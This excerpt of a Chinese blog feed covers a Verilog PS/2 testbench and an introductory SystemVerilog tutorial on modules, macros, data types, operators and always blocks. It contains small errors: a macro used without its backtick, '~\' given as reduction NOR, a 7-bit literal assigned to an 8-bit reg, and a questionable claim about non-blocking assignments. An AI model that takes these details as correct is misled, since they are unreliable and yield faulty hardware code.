punctuation">(</span>ps2_clock<span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token punctuation">.</span><span class="token function">ps2_data</span><span class="token punctuation">(</span>ps2_data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>按照 PS/2 的协议, 按顺序给 ps2_clock 和 ps2_data 赋值, 穿插着延迟语句.</p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog">ps2_data <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span>ps2_clock <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span><span class="token number">#5</span><span class="token punctuation">;</span><span class="token comment">// start bit</span>ps2_data <span class="token operator">=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span><span class="token number">#5</span><span class="token punctuation">;</span>ps2_clock <span class="token operator">=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span><span class="token number">#5</span><span class="token punctuation">;</span>ps2_clock <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span><span class="token comment">// scancode[0] = 0</span>ps2_data <span class="token operator">=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span><span class="token number">#5</span><span class="token punctuation">;</span>ps2_clock <span class="token operator">=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span><span class="token number">#5</span><span class="token punctuation">;</span>ps2_clock <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span><span class="token comment">// scancode[1] = 0</span>ps2_data <span class="token operator">=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span><span class="token number">#5</span><span class="token punctuation">;</span>ps2_clock <span class="token operator">=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span><span class="token number">#5</span><span class="token punctuation">;</span>ps2_clock <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// scancode[7] = 1</span>ps2_data <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span><span class="token number">#5</span><span class="token punctuation">;</span>ps2_clock <span class="token operator">=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span><span class="token number">#5</span><span class="token punctuation">;</span>ps2_clock <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span><span class="token comment">// parity = 1</span>ps2_data <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span><span class="token number">#5</span><span class="token punctuation">;</span>ps2_clock <span class="token operator">=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span><span class="token number">#5</span><span class="token punctuation">;</span>ps2_clock <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span><span class="token comment">// stop</span>ps2_data <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span><span class="token number">#5</span><span class="token punctuation">;</span>ps2_clock <span class="token operator">=</span> <span class="token number">1'b0</span><span class="token punctuation">;</span><span class="token number">#5</span><span class="token punctuation">;</span>ps2_clock <span class="token operator">=</span> <span class="token number">1'b1</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>更进一步, 如果想要重复发送 scancode, 只不过内容会更改, 可以把这一步骤封装成 task, 完整写法见 <a href="https://git.tsinghua.edu.cn/digital-design-lab/project-template/-/blob/2076e9ffc1ff3e923365a9e79d6a944544a3b8e8/src/keyboard_tb.v#L12">Tsinghua GitLab</a>.</p><h3 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h3><p>总结一下: </p><ul><li>单独写一个仿真顶层模块, 例化要测试的模块.</li><li>测试模块的输入输出接到 <code>reg</code> 或者 <code>wire</code>.</li><li>时序逻辑在 <code>initial</code> 块初始化时钟信号, 用 <code>always #10 clock = ~clock;</code> 生成时钟信号.</li><li>复位信号在 <code>initial</code> 块内, 仿真信号由 0 变成 1, 再由 1 变成 0.</li><li>输入信号在 <code>initial</code> 块内, 对对应的 <code>reg</code> 信号进行赋值.</li></ul>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> COD </category>
          
      </categories>
      
      
        <tags>
            
            <tag> COD </tag>
            
            <tag> SV </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机组成原理 笔记3</title>
      <link href="/2023/09/28/systemverilog-ru-men-shi-yong/"/>
      <url>/2023/09/28/systemverilog-ru-men-shi-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="SystemVerilog入门使用"><a href="#SystemVerilog入门使用" class="headerlink" title="SystemVerilog入门使用"></a>SystemVerilog入门使用</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>写硬件和写软件代码是完全不同的——软件代码体现了指令顺序流执行的思想, 这是和冯诺依曼计算机的结构直接相关的; 硬件的特性是信号在各条信号线上并行传播, 硬件描述语言描述的是各个模块之间的连接关系. </p><h2 id="模块结构"><a href="#模块结构" class="headerlink" title="模块结构"></a>模块结构</h2><p>一个 2 输入与门的模块描述: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">module</span> and2x <span class="token punctuation">(</span>    <span class="token keyword">input</span> <span class="token keyword">wire</span> a<span class="token punctuation">,</span>    <span class="token keyword">input</span> <span class="token keyword">wire</span> b<span class="token punctuation">,</span>    <span class="token keyword">output</span> <span class="token keyword">wire</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">assign</span> r <span class="token operator">=</span> a <span class="token operator">&amp;</span> b<span class="token punctuation">;</span><span class="token keyword">endmodule</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>需要注意的几点是:</p><ul><li>输入和双向端口不能被定义为 <code>reg</code> 类型. </li><li>如果无法确认使用 <code>reg</code> 还是使用 <code>wire</code>, 都可以使用 <code>logic</code> 来代替. </li><li><code>wire</code> 是默认的类型, 所有的 <code>wire</code> 都可以省略. </li><li>通过 <code>assign</code> 语句进行持续赋值, 通常被用来进行组合逻辑的设计.</li></ul><h2 id="语言元素"><a href="#语言元素" class="headerlink" title="语言元素"></a>语言元素</h2><p>硬件描述里面的 “综合” 这个概念非常重要, 类比于将高级语言编译为机器语言, 最终在物理硬件上执行. “综合” 的含义就是将硬件描述语言的功能翻译为能够直接实现的电路, 可以放到 FPGA 或者直接转化为硬件电路, 用以执行所描述的功能. </p><h3 id="SystemVerilog-的语言元素"><a href="#SystemVerilog-的语言元素" class="headerlink" title="SystemVerilog 的语言元素"></a>SystemVerilog 的语言元素</h3><h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><p>在 C 语言中, 一个编程习惯是使用符号来代替常数硬编码. 这一点在 SystemVerilog 中也是一样的. 可以使用 <code>parameter</code> 来定义一个符号常量, 便于修改也增加了程序的可读性. 一个最为典型的应用就是来指定信号 (向量) 的宽度, 使用 parameter 的语法形式为: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">parameter</span> PARAM1<span class="token operator">=</span>EXP1<span class="token punctuation">,</span> PARAM2<span class="token operator">=</span>EXP2<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="编译指导语句"><a href="#编译指导语句" class="headerlink" title="编译指导语句"></a>编译指导语句</h4><p>SystemVerilog 中的编译指导语句与 C 语言 (例如 <code>#include</code>) 类似, 指示编译器的工作. 编译指导语句都是不可综合的, 会在编译的时候进行字符串等替换操作. </p><h5 id="define-宏定义语句"><a href="#define-宏定义语句" class="headerlink" title="`define 宏定义语句"></a><code>`define</code> 宏定义语句</h5><p><code>`define</code> 语句相当于 C 语言中的 <code>#define</code>, 在编译时, <code>`define</code> 的宏名称被替换为后面的字符串. 如: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token constant">`define</span> WIDTH <span class="token number">16</span><span class="token keyword">reg</span> <span class="token punctuation">[</span><span class="token constant">`WIDTH</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> r<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这就与 <code>reg[15:0]</code> 相当. 在每次使用宏名称的时候, 需要加上 <code>` </code>, 在 <code>`define</code> 这一行的行末不需要分号.  <code>`define</code> 的宏替换功能与 C 语言一样强大, 能够用来替换比较复杂的表达式. 例如: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token constant">`define</span> sum a<span class="token operator">+</span>b<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>定义之后, 可以使用: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">assign</span> res<span class="token operator">=</span>sum<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>来获得将两个 a 和 b 信号相加的效果.</p><h5 id="include-文件包含语句"><a href="#include-文件包含语句" class="headerlink" title="`include 文件包含语句"></a><code>`include</code> 文件包含语句</h5><p><code>`include</code> 语句相当于 C 语言中的 <code>#include</code> 语句, 用来包含其它的文件. 这里同样也没有行末的分号, 需要设置对应的相对路径, 例如: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token constant">`include</span> <span class="token string">"../common/adder.v"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="ifdef-else-elsif-endif-条件编译语句"><a href="#ifdef-else-elsif-endif-条件编译语句" class="headerlink" title="`ifdef,  `else, `elsif, `endif 条件编译语句"></a><code>`ifdef</code>,  <code>`else</code>, <code>`elsif</code>, <code>`endif</code> 条件编译语句</h5><p><code>`ifdef</code>, <code>`else</code>, <code>`elsif</code>, <code>`endif</code> 条件编译语句相当于在 C 语言中的 <code>#ifdef</code>, <code>#else</code>, <code>#elif</code>, <code>#endif</code> 语句, 用来设定哪一部分源代码会最终编译, 例如: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token constant">`define</span> sum a<span class="token operator">+</span>b<span class="token constant">`ifdef</span> sum<span class="token keyword">assign</span> res<span class="token operator">=</span>sum<span class="token punctuation">;</span><span class="token constant">`else</span><span class="token keyword">assign</span> res<span class="token operator">=</span>a<span class="token operator">+</span>b<span class="token punctuation">;</span><span class="token constant">`endif</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以通过控制 <code>sum</code> 是否定义来选择需要编译的源代码, 不需要编译的源代码就被忽略. 需要嵌套更多判断, 可以使用 <code>`elsif</code> 进一步判断. </p><h3 id="SystemVerilog-中的数据"><a href="#SystemVerilog-中的数据" class="headerlink" title="SystemVerilog 中的数据"></a>SystemVerilog 中的数据</h3><h4 id="整数常量"><a href="#整数常量" class="headerlink" title="整数常量"></a>整数常量</h4><p>在硬件开发的过程中, 不能够改变的量被称为是常量 (constants). 在处理器设计中, 最为重要的常量形式为整数, 整数常量按照一定的格式写出: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token operator">+/-</span> <span class="token operator">&lt;</span>位宽<span class="token operator">&gt;</span>'<span class="token operator">&lt;</span>进制<span class="token operator">&gt;&lt;</span>数字<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进制包括了二进制 (<code>b</code> 或者 <code>B</code>), 十进制 (<code>d</code> 或者 <code>D</code>), 八进制 (<code>o</code> 或者 <code>O</code>) 以及十六进制 (<code>h</code> 或者 <code>H</code>).</p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token number">8'b01001010</span><span class="token number">16'H45EF</span><span class="token operator">-</span><span class="token number">8'D123</span><span class="token operator">-</span><span class="token number">16'o3333</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="数据取值"><a href="#数据取值" class="headerlink" title="数据取值"></a>数据取值</h4><p>在进行硬件编码的时候, 除了 <code>0</code> 和 <code>1</code> 两个信号取值外, 还有其它的一些逻辑状态. 两个比较重要的是 <code>x</code>/<code>X</code> 和 <code>z</code>/<code>Z</code>.</p><p><code>x</code> 或者 <code>X</code> 的取值表明为不确定, 或者未知逻辑状态, 用于不关心对应信号值的情况.</p><p><code>z</code> 或者 <code>Z</code> 代表高阻态, 典型应用是用于获得内存的输入, 先将处理器引脚的状态置于 <code>z</code>, 经过一定的时间延迟, 可从对应的引脚处获得内存的输入值. </p><h4 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h4><p>基本数据类型包括了 <code>wire</code> 类型和 <code>reg</code> 类型. <code>wire</code> 类型代表了在硬件电路中的连线, 输出的值紧随着输入值的变化而变化. <code>reg</code> 数据类型会放到过程语句中进行赋值, 不一定必然会对应到硬件的寄存器, 综合时依据实际情况使用连线 (组合逻辑) 或者寄存器 (时序逻辑). </p><p>数据类型还有向量和标量的区别. 没有指定则默认为 1 位的位宽, 是一个标量. 向量使用中括号指定位宽, 形式为 <code>[msb:lsb]</code>. 例如: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">wire</span> <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> data<span class="token punctuation">;</span> <span class="token comment">// 这是一个 8 位的连线. </span><span class="token keyword">reg</span> <span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> res<span class="token punctuation">;</span>  <span class="token comment">// 32 位的数据变量</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在 SystemVerilog 中有非常方便的向量访问方式:</p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog">l <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// 获取 data 的最高位</span>lob <span class="token operator">=</span> res<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 获取数据 res 中的最低 8 位, 即最低一个字节</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="SystemVerilog-中的运算"><a href="#SystemVerilog-中的运算" class="headerlink" title="SystemVerilog 中的运算"></a>SystemVerilog 中的运算</h3><h4 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h4><p>位运算符是最基本的运算符, 表达了两个操作数对应的位进行位运算的结果.</p><ul><li><code>~</code> 按位取反.</li><li><code>&amp;</code> 按位与.</li><li><code>|</code> 按位或. </li><li><code>^</code> 按位异或.</li><li><code>^~</code> 或 <code>~^</code> 按位同或.</li><li><code>&gt;&gt;</code> 右移.</li><li><code>&lt;&lt;</code> 左移.</li></ul><p>在位运算符中还有一类特殊的运算符, 即缩位运算符. 可以将一个向量按照一定的位运算 “缩” 成 1 位. </p><ul><li><code>&amp;</code> 缩位与.</li><li><code>~&amp;</code> 缩位与非.</li><li><code>|</code> 缩位或.</li><li><code>~\</code> 缩位或非.</li><li><code>^</code> 缩位异或.</li><li><code>^~</code> 或 <code>~^</code> 缩位同或.</li></ul><p>例如 <code>reg [7:0] value;</code> 如果 <code>value = 7'b01010101</code>. 则 <code>&amp;value</code> 结果为 0, <code>|value</code> 结果为 1, <code>~^value</code> 结果为 1.</p><h4 id="关系和逻辑运算符"><a href="#关系和逻辑运算符" class="headerlink" title="关系和逻辑运算符"></a>关系和逻辑运算符</h4><p>这些运算符可用于条件判断, 取值结果为 <code>true</code> 或者 <code>false</code>. 着重解释一下全等运算符和不全等运算符.</p><ul><li><code>===</code> 关系运算符全等. </li><li><code>!==</code> 关系运算符不全等. </li></ul><p>相等运算符 <code>==</code> 在进行比较时, 需要按每位进行比较, 只有所有的位都相等的时候, 最后的结果值才会是 <code>true</code>. 如果其中的某一位是高阻态或者不定值, 最终的结果是不定值. 对于全等 <code>===</code> 来说, 这些高阻态或者不定值也需要进行比较, 完全一致才会获得 <code>true</code> 结果.  </p><div class="table-container"><table><thead><tr><th style="text-align:center">A</th><th style="text-align:center">B</th><th style="text-align:center">A==B</th><th style="text-align:center">A===B</th></tr></thead><tbody><tr><td style="text-align:center">4b1101</td><td style="text-align:center">4b1101</td><td style="text-align:center">1</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">4b1100</td><td style="text-align:center">4b1101</td><td style="text-align:center">0</td><td style="text-align:center">0</td></tr><tr><td style="text-align:center">4b110Z</td><td style="text-align:center">4b110Z</td><td style="text-align:center">X</td><td style="text-align:center">1</td></tr><tr><td style="text-align:center">4b11XX</td><td style="text-align:center">4b11XX</td><td style="text-align:center">X</td><td style="text-align:center">1</td></tr></tbody></table></div><h4 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h4><p>算术运算符并不是最基本的运算符, 需要使用对应的门电路组织成的组合逻辑来完成. 这是语言内部提供的高层的逻辑单元功能, 方便在开发的时候直接集成使用, 而不需要采用模块调用的方式. 在处理器的设计中, 算术运算符的最重要的作用是用来构成 ALU.</p><h4 id="位拼接运算符"><a href="#位拼接运算符" class="headerlink" title="位拼接运算符"></a>位拼接运算符</h4><p>位拼接运算符 <code>{ }</code> 能够把多个信号拼接为向量的形式. <code>{a[3:0], b[7:6],c}</code> 代表了将 <code>a</code> 的第 3 至第 0 位, <code>b</code> 的第 7 位和第 6 位, 以及信号 <code>c</code> 拼接在一起, 构成一个新的信号向量. </p><h2 id="SystemVerilog-的行为语句"><a href="#SystemVerilog-的行为语句" class="headerlink" title="SystemVerilog 的行为语句"></a>SystemVerilog 的行为语句</h2><h3 id="关于硬件描述语言功能的讨论"><a href="#关于硬件描述语言功能的讨论" class="headerlink" title="关于硬件描述语言功能的讨论"></a>关于硬件描述语言功能的讨论</h3><p>行为语句是 SystemVerilog 中最为重要的功能语句, 用来定义具体模块的行为. 在术语上一直使用的是硬件<strong>描述语言</strong>这样的叙述方式, 而不是硬件<strong>设计语言</strong>. 因为硬件描述语言大部分没有说明底层的硬件构成, 更多阐述模块对外的功能表现.</p><p>在使用硬件描述语言的时候, 更多的是描述对应的电路模块应具有什么功能. 硬件语言的编译器会翻译为对应的底层硬件的实现, 有一定的中立性, 不依赖于具体的物理实现方式. 因此, 描述完成之后不一定是可以综合的 (可物理实现的). 在开发的时候, 时刻要注意程序最终需要被转化为硬件电路. </p><h3 id="SystemVerilog-的行为语句综述"><a href="#SystemVerilog-的行为语句综述" class="headerlink" title="SystemVerilog 的行为语句综述"></a>SystemVerilog 的行为语句综述</h3><p>SystemVerilog 的行为语句包括赋值语句, 过程语句, 条件语句, 编译指导语句等. 不是所有的行为语句都是可以综合的, 但不可综合的行为语句作用也十分重要, 会被应用到仿真环境中. 在 SystemVerilog 中可综合的行为语句主要包括以下部分: </p><ol><li><code>always</code> 过程语句;</li><li>使用 <code>begin-end</code> 组合的语句块;</li><li>可以进行持续赋值的语句 <code>assign</code>; </li><li>阻塞的过程赋值语句 <code>=</code>, 非阻塞的过程赋值语句 <code>&lt;=</code>;</li><li><code>for</code> 循环语句. </li></ol><h3 id="always-过程语句"><a href="#always-过程语句" class="headerlink" title="always 过程语句"></a>always 过程语句</h3><p>一个模块的多个 <code>always</code> 过程语句是并行执行的. 在实现的时候, 通常会使用两种 <code>always</code> 过程语句: </p><ul><li><code>always_comb</code>: 用来实现<strong>组合逻辑</strong>;</li><li><code>always_ff</code>: 用来实现<strong>时钟边沿触发的时序逻辑</strong>.</li></ul><h4 id="always-comb-过程语句"><a href="#always-comb-过程语句" class="headerlink" title="always_comb 过程语句"></a>always_comb 过程语句</h4><p><code>always_comb</code> 过程语句的使用方法如下: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token important">always_comb</span>     语句 <span class="token punctuation">(</span>可以是一条语句<span class="token punctuation">,</span> 或者是语句块<span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果只有一条语句, 不需要加 <code>begin end</code> 构成语句块; 如果超过一条则需要构造成语句块. 更加经常使用的形式是如下形式:</p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token important">always_comb</span><span class="token keyword">begin</span>    <span class="token comment">//本过程的功能描述</span><span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>一个四选一数据选择器的模块例子: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">module</span> mux4_1 <span class="token punctuation">(</span>    <span class="token keyword">input</span> din1<span class="token punctuation">,</span>    <span class="token keyword">input</span> din2<span class="token punctuation">,</span>    <span class="token keyword">input</span> din3<span class="token punctuation">,</span>    <span class="token keyword">input</span> din4<span class="token punctuation">,</span>    <span class="token keyword">input</span> se1<span class="token punctuation">,</span>    <span class="token keyword">input</span> se2<span class="token punctuation">,</span>    <span class="token keyword">output</span> <span class="token keyword">reg</span> out<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token important">always_comb</span>        <span class="token keyword">case</span> <span class="token punctuation">(</span><span class="token operator">{</span>se1<span class="token punctuation">,</span>se2<span class="token operator">}</span><span class="token punctuation">)</span>            <span class="token number">2'b00</span> <span class="token punctuation">:</span> out <span class="token operator">=</span> din1<span class="token punctuation">;</span>            <span class="token number">2'b01</span> <span class="token punctuation">:</span> out <span class="token operator">=</span> din2<span class="token punctuation">;</span>            <span class="token number">2'b10</span> <span class="token punctuation">:</span> out <span class="token operator">=</span> din3<span class="token punctuation">;</span>            <span class="token number">2'b11</span> <span class="token punctuation">:</span> out <span class="token operator">=</span> din4<span class="token punctuation">;</span>        <span class="token keyword">endcase</span><span class="token keyword">endmodule</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个 <code>always_comb</code> 过程语句的有四个输入信号以及两个选择信号, 任何一个发生变化, 输出都将发生变化. </p><h4 id="always-ff-过程语句"><a href="#always-ff-过程语句" class="headerlink" title="always_ff 过程语句"></a>always_ff 过程语句</h4><p>在实现时序逻辑的时候, 需要在上升沿或者下降沿事件中触发寄存器的更新. 在 SystemVerilog 中, 使用 <code>posedge</code> 指定上升沿, 使用 <code>negedge</code> 指定下降沿. 可以将边沿敏感类型的信号放置到 <code>always_ff</code>: </p><pre class="line-numbers language-none"><code class="language-none">always_ff @(posedge clk)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里响应的是一个时钟 <code>clk</code> 的上升沿信号, 时钟是驱动处理器执行的基础, 在进行综合的时候会综合出时序电路. </p><h3 id="begin-end-块语句"><a href="#begin-end-块语句" class="headerlink" title="begin/end 块语句"></a>begin/end 块语句</h3><p><code>begin/end</code> 能够将多条语句组合成语句块.</p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">module</span> decoder2_4 <span class="token punctuation">(</span>    <span class="token keyword">input</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> in<span class="token punctuation">,</span>    <span class="token keyword">output</span> <span class="token keyword">reg</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> out<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token important">always_comb</span> <span class="token keyword">begin</span>        out <span class="token operator">=</span> <span class="token number">4'b0000</span><span class="token punctuation">;</span>        <span class="token function">case</span><span class="token punctuation">(</span>in<span class="token punctuation">)</span>            <span class="token number">2'b00</span> <span class="token punctuation">:</span> out <span class="token operator">=</span> <span class="token number">4'b0001</span><span class="token punctuation">;</span>            <span class="token number">2'b01</span> <span class="token punctuation">:</span> out <span class="token operator">=</span> <span class="token number">4'b0010</span><span class="token punctuation">;</span>            <span class="token number">2'b10</span> <span class="token punctuation">:</span> out <span class="token operator">=</span> <span class="token number">4'b0100</span><span class="token punctuation">;</span>            <span class="token number">2'b11</span> <span class="token punctuation">:</span> out <span class="token operator">=</span> <span class="token number">4'b1000</span><span class="token punctuation">;</span>        <span class="token keyword">endcase</span>    <span class="token keyword">end</span><span class="token keyword">endmodule</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为需要一个初值, 在 <code>begin/end</code> 中有两条语句, 必须构造出一个语句块, 也往往被称为是串行块, 其含义就是 “顺序执行” 的. 在硬件综合完成之后, 各个部分的电信号就开始驱动整个硬件电路信号扩散, 并逐步稳定下来, 输出会随着输入的变化而随时变化. </p><h3 id="赋值语句"><a href="#赋值语句" class="headerlink" title="赋值语句"></a>赋值语句</h3><p>赋值语句可以将不同的信号组织起来, 包括了持续赋值语句和过程赋值语句. 持续赋值语句在过程外使用, 与过程语句并行执行. 过程赋值语句在过程内串行执行, 用于描述过程的功能.</p><h4 id="持续赋值语句"><a href="#持续赋值语句" class="headerlink" title="持续赋值语句"></a>持续赋值语句</h4><p>在 SystemVerilog 中使用 <code>assign</code> 作为持续赋值语句使用, 用于对 <code>wire</code> 类型的变量进行赋值. 其对应的硬件即通过对输出进行赋值, 当输入变化时, 经过一定延迟, 输出就会按照 <code>assign</code> 所描述的那样发生变化. 例如: </p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">assign</span> res <span class="token operator">=</span> input_a <span class="token operator">&amp;</span> input_b<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在一个模块中, 可以有多个 <code>assign</code> 的持续赋值语句并行执行. 一个模块的持续赋值语句和前面所说的 <code>always</code> 过程语句可以出现多次, 执行关系也是并行的.</p><h4 id="过程赋值语句"><a href="#过程赋值语句" class="headerlink" title="过程赋值语句"></a>过程赋值语句</h4><p>在 <code>always</code> 过程里面的赋值语句被称为过程赋值语句, 一般用来对 <code>reg</code> 类型的变量进行赋值. 一个是非阻塞赋值语句 <code>&lt;=</code>, 一个是阻塞赋值语句 <code>=</code>. 之间的区别是: </p><ul><li>非阻塞赋值语句 <code>&lt;=</code> 不立即更新被赋值的信号, 等到整个过程块结束时才更新. 由于不是立即发生的, 在过程内仿佛这条语句不存在一样. 在这个执行的过程中, 所有的左值会维持不变, 反映了时钟边沿触发的寄存器的行为特征, 在 <code>always_ff</code> 中需要采用非阻塞赋值. </li></ul><ol><li>阻塞赋值语句 <code>=</code> 立即完成赋值操作, 左值立刻发生变化. 一个块语句中存在多条阻塞赋值语句, 会按照先后顺序关系执行. 这种行为模式和网络 IO 编程中的阻塞函数调用方式一样, 完成函数执行之后调用才会退出. 这种特性可以用来直观描述组合逻辑的行为特征, 在 <code>always_comb</code> 中需要采用阻塞赋值.</li></ol><p>非阻塞赋值要比阻塞赋值多加一个触发器, 因为信号的变化不是同步的, 需要进行一个周期的延迟. </p><h3 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h3><p>在 SystemVerilog 中, 条件语句包括了 <code>if-else</code> 语句以及 <code>case</code> 语句.</p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog"><span class="token keyword">module</span> decoder2_4 <span class="token punctuation">(</span>    <span class="token keyword">input</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> din<span class="token punctuation">,</span>    <span class="token keyword">output</span> <span class="token keyword">reg</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">]</span> dout<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token important">always_comb</span> <span class="token keyword">begin</span>        dout <span class="token operator">=</span> <span class="token number">4'b0000</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>din <span class="token operator">==</span> <span class="token number">2'b00</span><span class="token punctuation">)</span>            dout <span class="token operator">=</span> <span class="token number">4'b0001</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>din <span class="token operator">==</span> <span class="token number">2'b01</span><span class="token punctuation">)</span>            dout <span class="token operator">=</span> <span class="token number">4'b0010</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>din <span class="token operator">==</span> <span class="token number">2'b10</span><span class="token punctuation">)</span>            dout <span class="token operator">=</span> <span class="token number">4'b0100</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>din <span class="token operator">==</span> <span class="token number">2'b11</span><span class="token punctuation">)</span>            dout <span class="token operator">=</span> <span class="token number">4'b1000</span><span class="token punctuation">;</span>    <span class="token keyword">end</span><span class="token keyword">endmodule</span><span aria-hidden="true" 